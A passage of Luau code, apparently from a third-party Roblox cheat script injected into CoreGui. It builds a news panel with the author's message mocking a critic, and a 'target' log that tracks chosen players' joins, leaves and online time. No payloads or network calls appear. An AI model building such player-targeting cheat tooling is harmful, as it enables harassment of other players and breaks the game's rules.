_newsItem("الحجم",
    "حجم السكربت كبير جدا وكبير ومتوسط وصغير, نصيحتي لك خله افتراضي اطلق شي",
    "قسم الاعدادات", "UPDATE")

_newsItem("معلومات السيرفر",
    "يطلع لك تقريباً كل شي عن السيرفر, صراحه تعبت عليها مره والله, خذت مني ايام كثير",
    "قسم اخرى", "UPDATE")

_newsHeading("كلام مني لكم")

local _impMsg = "السلام عليكم ورحمةً من الله وبركاته, كثير حسداء لفقو علي اني استخدم AI في السكربت وتحديداً شخص حاسد يقول اني استخدم AI بسكربتي وهو اصلا ما يعرف الفرق بين Lua و Luau عالعموم اللي وضح لي الشي ذا اني دخلت سيرفره وشفت رسايله القديمه واكتشفت انه كاتب اشياء كثير وبالنهايه يقول لغة Lua عظيمه, طيب يغبي فيه فرق بين Lua و Luau عالعموم ذا مو موضوعنا, انا يسعدني انك تكون متواجد بالسكربت, ما يهمني العدد ومايهموني الحساد اللي يهمني انك مبسوط بالسكربت وتعب سنتين و6 شهور ماراح عالفاضي, يهمني رضاك ياعزيزي مستخدم السكربت, باستنثاء الحُسّاد اللي لو احط حركات بالحروف ثبتت براسهم انه AI , عالعموم اتمنى السكربت ينال اعجابك واذا عندك مشاكل او اقتراح تشرفنا بالدسكورد بتلقى الرابط في الصفحة الرئيسية اضغط على الزر وحطه بقوقل وبيدخلك سيرفرنا, بالتوفيق"
local _impH = _newsTextH(_impMsg, 15, Enum.Font.Gotham) + 20

ImportantText = Instance.new("TextLabel")
ImportantText.Size = UDim2.new(1, -24, 0, _impH)
ImportantText.Position = UDim2.new(0, 12, 0, _newsY)
ImportantText.BackgroundTransparency = 1
ImportantText.Text = _impMsg
ImportantText.TextColor3 = Theme.Text
ImportantText.TextXAlignment = Enum.TextXAlignment.Right
ImportantText.TextYAlignment = Enum.TextYAlignment.Top
ImportantText.TextWrapped = true
ImportantText.Font = Enum.Font.Gotham
ImportantText.TextSize = 15
ImportantText.ZIndex = 3
ImportantText.Parent = ImportantCard
_T18ImportantTextLabel = ImportantText
_newsY = _newsY + _impH + 12

ImportantCard.Size = UDim2.new(1, -20, 0, _newsY)
_T18NewsCanvasH = 58 + _newsY + 20

T18RefreshNewsLayout = function(toLang)
    local lang = toLang or _T18Lang or "ar"
    local y = 12
    for _, entry in ipairs(_newsLayout) do
        if entry.kind == "heading" then
            entry.label.Text = T18TranslateText(entry.text, lang)
            entry.label.Position = UDim2.new(0, 12, 0, y)
            entry.line.Position = UDim2.new(0, 12, 0, y + 28)
            y = y + 38
        elseif entry.kind == "item" then
            local titleText = T18TranslateText(entry.title, lang)
            local descText = T18TranslateText(entry.desc, lang)
            local placeText = T18TranslateText("مكانه: ", lang) .. T18TranslateText(entry.place, lang)
            local descH = _newsTextH(descText, 14, Enum.Font.Gotham)
            local itemH = 10 + 36 + 8 + descH + 4 + 16 + 10

            entry.button.Text = titleText
            entry.item.Position = UDim2.new(0, 12, 0, y)
            entry.item.Size = UDim2.new(1, -24, 0, itemH)
            entry.descLabel.Text = descText
            entry.descLabel.Size = UDim2.new(1, -20, 0, descH)
            entry.placeLabel.Text = placeText
            entry.placeLabel.Position = UDim2.new(0, 10, 0, 54 + descH + 4)
            y = y + itemH + 10
        end
    end

    local importantText = (lang == "en") and _T18ImportantTextEn or _T18ImportantTextAr
    importantText = importantText or _impMsg
    local importantH = _newsTextH(importantText, 15, Enum.Font.Gotham) + 20
    ImportantText.Text = importantText
    ImportantText.Position = UDim2.new(0, 12, 0, y)
    ImportantText.Size = UDim2.new(1, -24, 0, importantH)
    y = y + importantH + 12

    ImportantCard.Size = UDim2.new(1, -20, 0, y)
    _T18NewsCanvasH = 58 + y + 20
    if _T18ImportantScroll then
        _T18ImportantScroll.CanvasSize = UDim2.new(0, 0, 0, _T18NewsCanvasH)
    end
end
end

do
    local ImportantScroll = Instance.new("ScrollingFrame")
    ImportantScroll.Size = UDim2.new(1, 0, 1, 0)
    ImportantScroll.BackgroundTransparency = 1
    ImportantScroll.BorderSizePixel = 0
    ImportantScroll.ScrollBarThickness = isTouchDevice and 3 or 4
    ImportantScroll.ScrollBarImageColor3 = Theme.Active
    ImportantScroll.CanvasSize = UDim2.new(0, 0, 0, _T18NewsCanvasH or 400)
    ImportantScroll.ScrollingDirection = Enum.ScrollingDirection.Y
    ImportantScroll.ElasticBehavior = Enum.ElasticBehavior.Always
    ImportantScroll.Parent = ImportantPage
    _T18ImportantScroll = ImportantScroll
    for _, child in ipairs(ImportantPage:GetChildren()) do
        if child ~= ImportantScroll then child.Parent = ImportantScroll end
    end
end

_T18ImportantTextAr = "السلام عليكم ورحمةً من الله وبركاته, كثير حسداء لفقو علي اني استخدم AI في السكربت وتحديداً شخص حاسد يقول اني استخدم AI بسكربتي وهو اصلا ما يعرف الفرق بين Lua و Luau عالعموم اللي وضح لي الشي ذا اني دخلت سيرفره وشفت رسايله القديمه واكتشفت انه كاتب اشياء كثير وبالنهايه يقول لغة Lua عظيمه, طيب يغبي فيه فرق بين Lua و Luau عالعموم ذا مو موضوعنا, انا يسعدني انك تكون متواجد بالسكربت, ما يهمني العدد ومايهموني الحساد اللي يهمني انك مبسوط بالسكربت وتعب سنتين و6 شهور ماراح عالفاضي, يهمني رضاك ياعزيزي مستخدم السكربت, باستنثاء الحُسّاد اللي لو احط حركات بالحروف ثبتت براسهم انه AI , عالعموم اتمنى السكربت ينال اعجابك واذا عندك مشاكل او اقتراح تشرفنا بالدسكورد بتلقى الرابط في الصفحة الرئيسية اضغط على الزر وحطه بقوقل وبيدخلك سيرفرنا, بالتوفيق"
_T18ImportantTextEn = "Peace, mercy, and blessings be upon you. A lot of jealous people have made up stories that I use AI in this script. One jealous guy in particular keeps saying I use AI, even though he doesn't know the difference between Lua and Luau. What gave him away? I joined his server, read his old messages, and saw him write loads of stuff, then say Lua is a great language. Come on, you idiot—there's a difference between Lua and Luau. Anyway, that's not the point. I'm glad you're here using the script. I don't care about the numbers, and the haters don't matter to me. What matters is that you're enjoying the script and that two and a half years of work weren't for nothing. Your satisfaction matters to me, dear user—except for the haters who see a few diacritics and immediately decide it's AI. Anyway, I hope you enjoy the script. If you have a problem or suggestion, come find me on Discord. The server invite is on the main page; press the button, paste it into Google, and it'll take you to our server. Good luck!"

Input.Parent = TargetPage
Input.Size = UDim2.new(1, -112, 0, 40)
Input.Position = UDim2.new(0, 10, 0, 170)

local PickerBtn = Instance.new("TextButton")
PickerBtn.Name = "PickerBtn"
PickerBtn.Size = UDim2.new(0, 40, 0, 40)
PickerBtn.Position = UDim2.new(1, -50, 0, 170)
PickerBtn.BackgroundColor3 = Theme.ButtonBlue
local _pi = PickerBtn:FindFirstChild("PickerIcon") if _pi then _pi.Visible = true end
PickerBtn.BackgroundTransparency = 0.1
PickerBtn.Text = ""
PickerBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
PickerBtn.Font = Enum.Font.GothamBold
PickerBtn.TextSize = 22
PickerBtn.AutoButtonColor = false
PickerBtn.Parent = TargetPage
makeCorner(PickerBtn, 10)
makeStroke(PickerBtn, Theme.Accent, 1, 0.2)
local _pickerImg = Instance.new("ImageLabel")
_pickerImg.Name = "PickerIcon"
_pickerImg.Size = UDim2.new(1, -8, 1, -8)
_pickerImg.Position = UDim2.new(0, 4, 0, 4)
_pickerImg.BackgroundTransparency = 1
_pickerImg.Image = "rbxassetid://71428152525797"
_pickerImg.ScaleType = Enum.ScaleType.Fit
_pickerImg.ZIndex = PickerBtn.ZIndex + 1
_pickerImg.Parent = PickerBtn

_T18TargetLog = {}

_T18TimerRefs = {}
_t18LogFilterText = ""
local TargetLogPanel
_t18RefreshTargetLog = nil
_t18SyncLogFilterTarget = nil

local function _t18FmtTimer(s)
    s = math.max(0, math.floor(s))
    local h = math.floor(s/3600)
    local m = math.floor((s%3600)/60)
    local sc = s%60
    if h > 0 then
        return string.format("%d:%02d:%02d", h, m, sc)
    else
        return string.format("%02d:%02d", m, sc)
    end
end

function _t18FmtSession(s)
    s = math.max(0, math.floor(s))
    local h = math.floor(s / 3600)
    local m = math.floor((s % 3600) / 60)
    local sc = s % 60
    return string.format("%02d:%02d:%02d", h, m, sc)
end

function _t18OnlineTime(ent)
    local total = ent.onlineElapsed or 0
    if ent.online and ent.sessionStart then
        total = total + math.max(0, tick() - ent.sessionStart)
    end
    return math.max(0, total)
end

local function _t18LogTarget(name)
    if not name or #name < 1 then return nil end
    local now = tick()
    local targetPlayer = nil
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name == name then targetPlayer = p break end
    end
    local entry = _T18TargetLog[name]
    if entry then
        entry.count = entry.count + 1
        if targetPlayer then
            entry.userId = targetPlayer.UserId
            entry.displayName = targetPlayer.DisplayName
        end
        if not entry.online and targetPlayer then
            entry.online = true
            entry.joinCount = (entry.joinCount or 0) + 1
            entry.sessionStart = now
            entry.lastOfflineDuration = entry.offlineStart and (now - entry.offlineStart) or (entry.lastOfflineDuration or 0)
            entry.offlineStart = nil
        end
    else
        _T18TargetLog[name] = {
            count = 1,
            startTime = now,
            sessionStart = targetPlayer and now or nil,
            offlineStart = targetPlayer and nil or now,
            onlineElapsed = 0,
            lastOfflineDuration = 0,
            leaveCount = 0,
            joinCount = targetPlayer and 1 or 0,
            online = targetPlayer ~= nil,
            userId = targetPlayer and targetPlayer.UserId or nil,
            displayName = targetPlayer and targetPlayer.DisplayName or nil,
        }
    end
    if _t18UpdateLogStats then _t18UpdateLogStats() end
    return _T18TargetLog[name]
end

Players.PlayerRemoving:Connect(function(p)
    if p == LocalPlayer then return end
    local entry = _T18TargetLog[p.Name]
    if entry and entry.online then
        local now = tick()
        entry.onlineElapsed = (entry.onlineElapsed or 0) + math.max(0, (entry.sessionStart and (now - entry.sessionStart)) or 0)
        entry.leaveCount = entry.leaveCount + 1
        entry.online = false
        entry.offlineStart = now
        entry.lastOfflineDuration = 0
        entry.sessionStart = nil
        local refs = _T18TimerRefs[p.Name]
        if refs then
            if refs.status then
                refs.status.Text = "● خارج"
                refs.status.TextColor3 = Color3.fromRGB(255,100,110)
            end
            if refs.leaveLabel then
                refs.leaveLabel.Text = "خرج " .. entry.leaveCount .. " مرات"
            end
            if refs.timer then
                refs.timer.Text = "منذ " .. _t18FmtTimer(_t18OnlineTime(entry))
            end
            if refs.countLabel then
                refs.countLabel.Text = "دخول " .. tostring(entry.joinCount or 0) .. "  •  خروج " .. tostring(entry.leaveCount or 0)
            end
            if refs.offlineTimer then
                refs.offlineTimer.Text = "خارج: " .. _t18FmtTimer(0)
            end
            if refs.dot then
                refs.dot.BackgroundColor3 = Color3.fromRGB(255, 100, 110)
            end
            if refs.stroke then
                refs.stroke.Color = Color3.fromRGB(100, 35, 45)
            end
            if refs.accent then
                refs.accent.BackgroundColor3 = Color3.fromRGB(255, 100, 110)
            end
            if refs.rowBg then
                refs.rowBg = Color3.fromRGB(70, 25, 25)
            end
            if refs.hoverBg then
                refs.hoverBg = Color3.fromRGB(88, 32, 36)
            end
            if refs.row then
                refs.row.BackgroundColor3 = Color3.fromRGB(70,25,25)
            end
        end
    end
    if _t18UpdateLogStats then _t18UpdateLogStats() end
end)

Players.PlayerAdded:Connect(function(p)
    if p == LocalPlayer then return end
    local entry = _T18TargetLog[p.Name]
    if entry then
        entry.userId = p.UserId
        entry.displayName = p.DisplayName
    end
    if entry and not entry.online then
        local now = tick()
        entry.online = true
        entry.joinCount = (entry.joinCount or 0) + 1
        entry.sessionStart = now
        entry.lastOfflineDuration = entry.offlineStart and (now - entry.offlineStart) or (entry.lastOfflineDuration or 0)
        entry.offlineStart = nil
        local refs = _T18TimerRefs[p.Name]
        if refs then
            if refs.status then
                refs.status.Text = "● متصل"
                refs.status.TextColor3 = Color3.fromRGB(100,220,100)
            end
            if refs.timer then
                refs.timer.Text = "منذ " .. _t18FmtTimer(_t18OnlineTime(entry))
            end
            if refs.row then
                refs.row.BackgroundColor3 = Color3.fromRGB(20,55,35)
            end
            if refs.countLabel then
                refs.countLabel.Text = "دخول " .. tostring(entry.joinCount or 0) .. "  •  خروج " .. tostring(entry.leaveCount or 0)
            end
            if refs.dot then
                refs.dot.BackgroundColor3 = Color3.fromRGB(100, 220, 100)
            end
            if refs.stroke then
                refs.stroke.Color = Color3.fromRGB(40, 90, 55)
            end
            if refs.accent then
                refs.accent.BackgroundColor3 = Color3.fromRGB(100, 220, 100)
            end
            if refs.rowBg then
                refs.rowBg = Color3.fromRGB(20, 55, 35)
            end
            if refs.hoverBg then
                refs.hoverBg = Color3.fromRGB(28, 72, 46)
            end
            if refs.avatar then
                refs.avatar.Image = "rbxthumb://type=AvatarHeadShot&id=" .. tostring(p.UserId) .. "&w=150&h=150"
            end
            if refs.fallback then
                refs.fallback.Visible = false
            end
            if refs.nameLabel then
                refs.nameLabel.Text = p.DisplayName
            end
            if refs.userLabel then
                refs.userLabel.Text = p.Name
            end
        end
    end
    if _t18UpdateLogStats then _t18UpdateLogStats() end
end)

local ListBtn = Instance.new("TextButton")
ListBtn.Name = "ListBtn"
ListBtn.Size = UDim2.new(0, 40, 0, 40)
ListBtn.Position = UDim2.new(1, -96, 0, 170)
ListBtn.BackgroundColor3 = Theme.ButtonGreen
ListBtn.BackgroundTransparency = 0.1
ListBtn.Text = ""
ListBtn.AutoButtonColor = false
ListBtn.ZIndex = 5
ListBtn.Parent = TargetPage
makeCorner(ListBtn, 10)
makeStroke(ListBtn, Theme.Accent, 1, 0.2)
local _listImg = Instance.new("ImageLabel")
_listImg.Size = UDim2.new(1, 0, 1, 0)
_listImg.Position = UDim2.new(0, 0, 0, 0)
_listImg.BackgroundTransparency = 1
_listImg.Image = "rbxassetid://122298736585626"
_listImg.ScaleType = Enum.ScaleType.Crop
_listImg.ZIndex = 10
_listImg.Parent = ListBtn

pcall(function()
    local coreGui = game:GetService("CoreGui")
    for _, ch in ipairs(coreGui:GetChildren()) do
        if ch.Name == "T18TargetLogGui" then ch:Destroy() end
    end
end)
pcall(function()
    local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
    if playerGui then
        for _, ch in ipairs(playerGui:GetChildren()) do
            if ch.Name == "T18TargetLogGui" then ch:Destroy() end
        end
    end
end)

-- Keep this whole external-window setup in a block scope so it does not
-- consume top-level locals (Luau allows at most 200 per function).
do
    do
        local gui = Instance.new("ScreenGui")
        gui.Name = "T18TargetLogGui"
        gui.ResetOnSpawn = false
        gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        gui.DisplayOrder = 2147483647
        gui.IgnoreGuiInset = true
        pcall(function() gui.Parent = game:GetService("CoreGui") end)
        if not gui.Parent then
            gui.Parent = LocalPlayer:WaitForChild("PlayerGui")
        end

        local viewport = Vector2.new(1280, 720)
        pcall(function()
            local cam = workspace.CurrentCamera
            if cam and cam.ViewportSize.X > 0 and cam.ViewportSize.Y > 0 then
                viewport = cam.ViewportSize
            end
        end)
        local panelW = 360
        local panelH = 450
        if viewport.X < 420 then panelW = math.max(260, viewport.X - 24) end
        if viewport.Y < 480 then panelH = math.max(260, viewport.Y - 24) end
        local panelX = math.clamp(viewport.X - panelW - 16, 12, math.max(12, viewport.X - panelW - 12))
        local panelY = math.clamp(math.floor((viewport.Y - panelH) * 0.5), 12, math.max(12, viewport.Y - panelH - 12))

        TargetLogPanel = Instance.new("Frame")
        TargetLogPanel.Name = "TargetLogPanel"
        TargetLogPanel.Size = UDim2.new(0, panelW, 0, panelH)
        TargetLogPanel.Position = UDim2.new(0, panelX, 0, panelY)
        TargetLogPanel.BackgroundColor3 = Theme.Panel
        TargetLogPanel.BackgroundTransparency = 0.03
        TargetLogPanel.BorderSizePixel = 0
        TargetLogPanel.Visible = false
        TargetLogPanel.ZIndex = 40
        TargetLogPanel.Parent = gui
        makeCorner(TargetLogPanel, 12)
        makeStroke(TargetLogPanel, Theme.Border, 1, 0.12)
        makeShadow(TargetLogPanel)
        TargetLogPanel:SetAttribute("ExpandedHeight", panelH)
        TargetLogPanel:SetAttribute("HomeX", panelX)
        TargetLogPanel:SetAttribute("HomeY", panelY)
        UiFx.makeGradient(TargetLogPanel, {
            ColorSequenceKeypoint.new(0, Color3.fromRGB(18, 18, 18)),
            ColorSequenceKeypoint.new(0.52, Color3.fromRGB(9, 9, 9)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(3, 3, 3)),
        }, 35)
        UiFx.makeStarField(TargetLogPanel, 34)

        do
            local topLine = Instance.new("Frame")
            topLine.Name = "TlTopLine"
            topLine.Size = UDim2.new(1, -28, 0, 1)
            topLine.Position = UDim2.new(0, 14, 0, 0)
            topLine.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            topLine.BackgroundTransparency = 0.55
            topLine.BorderSizePixel = 0
            topLine.ZIndex = 44
            topLine.Parent = TargetLogPanel
            local topGrad = Instance.new("UIGradient")
            topGrad.Transparency = NumberSequence.new({
                NumberSequenceKeypoint.new(0, 1),
                NumberSequenceKeypoint.new(0.5, 0.25),
                NumberSequenceKeypoint.new(1, 1),
            })
            topGrad.Parent = topLine
        end
    end

    do
        local header = Instance.new("Frame")
        header.Name = "TlHeader"
        header.Size = UDim2.new(1, 0, 0, 52)
        header.BackgroundColor3 = Theme.Header
        header.BackgroundTransparency = 0.02
        header.BorderSizePixel = 0
        header.Active = true
        header.ZIndex = 41
        header.Parent = TargetLogPanel
        makeCorner(header, 12)
        UiFx.makeGradient(header, {
            ColorSequenceKeypoint.new(0, Color3.fromRGB(10, 10, 10)),
            ColorSequenceKeypoint.new(0.6, Color3.fromRGB(6, 6, 6)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(18, 18, 18)),
        }, 15)
        UiFx.makeStarField(header, 18)

        local headerFix = Instance.new("Frame")
        headerFix.Name = "TlHeaderFix"
        headerFix.Size = UDim2.new(1, 0, 0, 10)
        headerFix.Position = UDim2.new(0, 0, 1, -10)
        headerFix.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        headerFix.BackgroundTransparency = 0.08
        headerFix.BorderSizePixel = 0
        headerFix.ZIndex = 41
        headerFix.Parent = header

        local accent = Instance.new("Frame")
        accent.Name = "TlHeaderAccent"
        accent.Size = UDim2.new(1, -24, 0, 1)
        accent.Position = UDim2.new(0, 12, 1, -1)
        accent.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
        accent.BorderSizePixel = 0
        accent.ZIndex = 43
        accent.Parent = header
        local accentGrad = Instance.new("UIGradient")
        accentGrad.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(70, 70, 70)),
            ColorSequenceKeypoint.new(0.5, Color3.fromRGB(245, 245, 245)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(70, 70, 70)),
        })
        accentGrad.Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 0.9),
            NumberSequenceKeypoint.new(0.5, 0.05),
            NumberSequenceKeypoint.new(1, 0.9),
        })
        accentGrad.Parent = accent

        do
            local badge = Instance.new("Frame")
            badge.Name = "TlBadge"
            badge.Size = UDim2.new(0, 34, 0, 34)
            badge.Position = UDim2.new(1, -42, 0, 8)
            badge.BackgroundColor3 = Theme.PanelSoft
            badge.BackgroundTransparency = 0.04
            badge.BorderSizePixel = 0
            badge.ZIndex = 42
            badge.Parent = header
            makeCorner(badge, 99)
            makeStroke(badge, Color3.fromRGB(150, 150, 150), 1, 0.2)
            UiFx.makeGradient(badge, {
                ColorSequenceKeypoint.new(0, Color3.fromRGB(240, 240, 240)),
                ColorSequenceKeypoint.new(0.5, Color3.fromRGB(70, 70, 70)),
                ColorSequenceKeypoint.new(1, Color3.fromRGB(240, 240, 240)),
            }, 0)

            local ownerAvatar = Instance.new("ImageLabel")
            ownerAvatar.Name = "TlOwnerAvatar"
            ownerAvatar.AnchorPoint = Vector2.new(0.5, 0.5)
            ownerAvatar.Size = UDim2.new(1, -4, 1, -4)
            ownerAvatar.Position = UDim2.new(0.5, 0, 0.5, 0)
            ownerAvatar.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
            ownerAvatar.BorderSizePixel = 0
            ownerAvatar.ScaleType = Enum.ScaleType.Crop
            ownerAvatar.Image = "rbxthumb://type=AvatarHeadShot&id=" .. tostring(LocalPlayer.UserId) .. "&w=150&h=150"
            ownerAvatar.ZIndex = 44
            ownerAvatar.Parent = badge
            makeCorner(ownerAvatar, 99)

            local ownerDot = Instance.new("Frame")
            ownerDot.Name = "TlOwnerDot"
            ownerDot.Size = UDim2.new(0, 9, 0, 9)
            ownerDot.Position = UDim2.new(0, 1, 1, -10)
            ownerDot.BackgroundColor3 = Color3.fromRGB(235, 235, 235)
            ownerDot.BorderSizePixel = 0
            ownerDot.ZIndex = 45
            ownerDot.Parent = badge
            makeCorner(ownerDot, 99)
            makeStroke(ownerDot, Color3.fromRGB(5, 6, 9), 2, 0)
        end

        do
            local brand = Instance.new("TextLabel")
            brand.Name = "TlBrand"
            brand.Size = UDim2.new(1, -198, 0, 10)
            brand.Position = UDim2.new(0, 150, 0, 0)
            brand.BackgroundTransparency = 1
            brand.Text = "R7L"
            brand.TextColor3 = Color3.fromRGB(255, 255, 255)
            brand.TextXAlignment = Enum.TextXAlignment.Right
            brand.Font = Enum.Font.GothamBlack
            brand.TextSize = 9
            brand.ZIndex = 42
            brand.Parent = header
            UiFx.makeGradient(brand, {
                ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
                ColorSequenceKeypoint.new(0.5, Color3.fromRGB(150, 150, 150)),
                ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255)),
            }, 90)

            local title = Instance.new("TextLabel")
            title.Name = "TlTitle"
            title.Size = UDim2.new(1, -198, 0, 19)
            title.Position = UDim2.new(0, 150, 0, 10)
            title.BackgroundTransparency = 1
            title.Text = "عداد"
            title.TextColor3 = Theme.Text
            title.TextXAlignment = Enum.TextXAlignment.Right
            title.Font = Enum.Font.GothamBlack
            title.TextSize = 15
            title.TextTruncate = Enum.TextTruncate.AtEnd
            title.ZIndex = 42
            title.Parent = header

            local subtitle = Instance.new("TextLabel")
            subtitle.Name = "TlSubtitle"
            subtitle.Size = UDim2.new(1, -198, 0, 12)
            subtitle.Position = UDim2.new(0, 150, 0, 29)
            subtitle.BackgroundTransparency = 1
            subtitle.Text = "مالك داعي ما تجلدهم على هالعداد"
            subtitle.TextColor3 = Theme.Muted
            subtitle.TextXAlignment = Enum.TextXAlignment.Right
            subtitle.Font = Enum.Font.Gotham
            subtitle.TextSize = 8
            subtitle.TextTruncate = Enum.TextTruncate.AtEnd
            subtitle.ZIndex = 42
            subtitle.Parent = header
        end

        do
            local live = Instance.new("Frame")
            live.Name = "TlLive"
            live.Size = UDim2.new(0, 78, 0, 24)
            live.Position = UDim2.new(0, 68, 0, 9)
            live.BackgroundColor3 = Theme.PanelSoft
            live.BackgroundTransparency = 0.16
            live.BorderSizePixel = 0
            live.ZIndex = 42
            live.Parent = header
            makeCorner(live, 8)
            makeStroke(live, Theme.Border, 1, 0.3)
            UiFx.makeStarField(live, 5)

            local liveDot = Instance.new("Frame")
            liveDot.Name = "TlLiveDot"
            liveDot.Size = UDim2.new(0, 7, 0, 7)
            liveDot.Position = UDim2.new(1, -14, 0.5, -3.5)
            liveDot.BackgroundColor3 = Color3.fromRGB(235, 235, 235)
            liveDot.BorderSizePixel = 0
            liveDot.ZIndex = 44
            liveDot.Parent = live
            makeCorner(liveDot, 99)
            makeStroke(liveDot, Color3.fromRGB(4, 6, 8), 1, 0.2)

            local liveText = Instance.new("TextLabel")
            liveText.Name = "TlLiveText"
            liveText.Size = UDim2.new(1, -30, 1, 0)
            liveText.Position = UDim2.new(0, 6, 0, 0)
            liveText.BackgroundTransparency = 1
            liveText.Text = "0 متصل"
            liveText.TextColor3 = Theme.Text
            liveText.TextXAlignment = Enum.TextXAlignment.Right
            liveText.Font = Enum.Font.GothamBold
            liveText.TextSize = 9
            liveText.ZIndex = 44
            liveText.Parent = live

            local pulse = TweenService:Create(liveDot, TweenInfo.new(1.15, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {
                BackgroundTransparency = 0.55,
            })
            pulse:Play()
        end

        do
            local close = Instance.new("TextButton")
            close.Name = "TlClose"
            close.Size = UDim2.new(0, 26, 0, 26)
            close.Position = UDim2.new(0, 6, 0, 8)
            close.BackgroundColor3 = Theme.ButtonDefaultAlt
            close.BackgroundTransparency = 0.04
            close.Text = "×"
            close.TextColor3 = Theme.Text
            close.Font = Enum.Font.GothamBold
            close.TextSize = 18
            close.AutoButtonColor = false
            close.ZIndex = 43
            close.Parent = header
            makeCorner(close, 8)
            makeStroke(close, Theme.Border, 1, 0.15)
            close.MouseEnter:Connect(function()
                TweenService:Create(close, TweenInfo.new(0.12), {BackgroundColor3 = Theme.Active}):Play()
            end)
            close.MouseLeave:Connect(function()
                TweenService:Create(close, TweenInfo.new(0.18), {BackgroundColor3 = Theme.ButtonDefaultAlt}):Play()
            end)
            close.MouseButton1Click:Connect(function()
                _t18SetTargetLogVisible(false)
            end)
        end

        do
            local minimize = Instance.new("TextButton")
            minimize.Name = "TlMin"
            minimize.Size = UDim2.new(0, 26, 0, 26)
            minimize.Position = UDim2.new(0, 36, 0, 8)
            minimize.BackgroundColor3 = Theme.ButtonDefaultAlt
            minimize.BackgroundTransparency = 0.04
            minimize.Text = "–"
            minimize.TextColor3 = Theme.Text
            minimize.Font = Enum.Font.GothamBold
            minimize.TextSize = 18
            minimize.AutoButtonColor = false
            minimize.ZIndex = 43
            minimize.Parent = header
            makeCorner(minimize, 8)
            makeStroke(minimize, Theme.Border, 1, 0.25)
            minimize.MouseEnter:Connect(function()
                TweenService:Create(minimize, TweenInfo.new(0.12), {BackgroundColor3 = Theme.Active}):Play()
            end)
            minimize.MouseLeave:Connect(function()
                TweenService:Create(minimize, TweenInfo.new(0.18), {BackgroundColor3 = Theme.ButtonDefaultAlt}):Play()
            end)
            minimize.MouseButton1Click:Connect(function()
                _t18ToggleTargetLogMinimize()
            end)
        end
    end

    do
        local footer = Instance.new("Frame")
        footer.Name = "TlFooter"
        footer.Size = UDim2.new(1, -16, 0, 36)
        footer.Position = UDim2.new(0, 8, 1, -46)
        footer.BackgroundColor3 = Theme.Card
        footer.BackgroundTransparency = 0.06
        footer.BorderSizePixel = 0
        footer.ZIndex = 41
        footer.Parent = TargetLogPanel
        makeCorner(footer, 10)
        makeStroke(footer, Theme.Border, 1, 0.25)
        UiFx.makeGradient(footer, {
            ColorSequenceKeypoint.new(0, Color3.fromRGB(24, 24, 24)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(6, 6, 6)),
        }, 90)
        UiFx.makeStarField(footer, 10)

        local sessionClock = Instance.new("TextLabel")
        sessionClock.Name = "TlSessionClock"
        sessionClock.Size = UDim2.new(1, -20, 0, 21)
        sessionClock.Position = UDim2.new(0, 10, 0, 2)
        sessionClock.BackgroundTransparency = 1
        sessionClock.Text = "00:00:00"
        sessionClock.TextColor3 = Color3.fromRGB(255, 255, 255)
        sessionClock.Font = Enum.Font.Code
        sessionClock.TextSize = 16
        sessionClock.TextXAlignment = Enum.TextXAlignment.Center
        sessionClock.ZIndex = 43
        sessionClock.Parent = footer
        UiFx.makeGradient(sessionClock, {
            ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
            ColorSequenceKeypoint.new(0.5, Color3.fromRGB(165, 165, 165)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255)),
        }, 0)

        local sessionCaption = Instance.new("TextLabel")
        sessionCaption.Name = "TlSessionCaption"
        sessionCaption.Size = UDim2.new(1, -20, 0, 10)
        sessionCaption.Position = UDim2.new(0, 10, 0, 23)
        sessionCaption.BackgroundTransparency = 1
        sessionCaption.Text = "منذ دخولك للسيرفر"
        sessionCaption.TextColor3 = Theme.Muted
        sessionCaption.Font = Enum.Font.Gotham
        sessionCaption.TextSize = 8
        sessionCaption.TextXAlignment = Enum.TextXAlignment.Center
        sessionCaption.ZIndex = 43
        sessionCaption.Parent = footer
    end

    _t18TargetLogMinimized = false
    _t18TargetLogOpen = false
    _t18TargetLogMinToken = 0
    _t18TargetLogSlideToken = 0
    _t18SessionStart = tick()

    function _t18UpdateLogStats()
        if not TargetLogPanel then return end
        local online = 0
        for _, ent in pairs(_T18TargetLog) do
            if ent.online then online = online + 1 end
        end
        local liveText = TargetLogPanel:FindFirstChild("TlLiveText", true)
        local liveDot = TargetLogPanel:FindFirstChild("TlLiveDot", true)
        if liveText then liveText.Text = tostring(online) .. " متصل" end
        if liveDot then
            liveDot.BackgroundColor3 = online > 0 and Color3.fromRGB(235, 235, 235) or Color3.fromRGB(120, 120, 120)
        end
        local clock = TargetLogPanel:FindFirstChild("TlSessionClock", true)
        if clock then
            clock.Text = _t18FmtSession(tick() - (_t18SessionStart or tick()))
        end
    end

    do
        local lastSessionSecond = -1
        RunService.Heartbeat:Connect(function()
            local elapsed = math.max(0, math.floor(tick() - (_t18SessionStart or tick())))
            if elapsed ~= lastSessionSecond then
                lastSessionSecond = elapsed
                local clock = TargetLogPanel and TargetLogPanel:FindFirstChild("TlSessionClock", true)
                if clock then clock.Text = _t18FmtSession(elapsed) end
            end
        end)
    end

    function _t18ToggleTargetLogMinimize()
        if not TargetLogPanel then return end
        _t18TargetLogMinimized = not _t18TargetLogMinimized
        _t18TargetLogMinToken = (_t18TargetLogMinToken or 0) + 1
        local token = _t18TargetLogMinToken
        local expanded = TargetLogPanel:GetAttribute("ExpandedHeight") or 450
        local targetH = _t18TargetLogMinimized and 52 or expanded
        local minBtn = TargetLogPanel:FindFirstChild("TlMin", true)
        if minBtn then minBtn.Text = _t18TargetLogMinimized and "+" or "–" end
        local headerFix = TargetLogPanel:FindFirstChild("TlHeaderFix", true)
        if headerFix then headerFix.Visible = not _t18TargetLogMinimized end
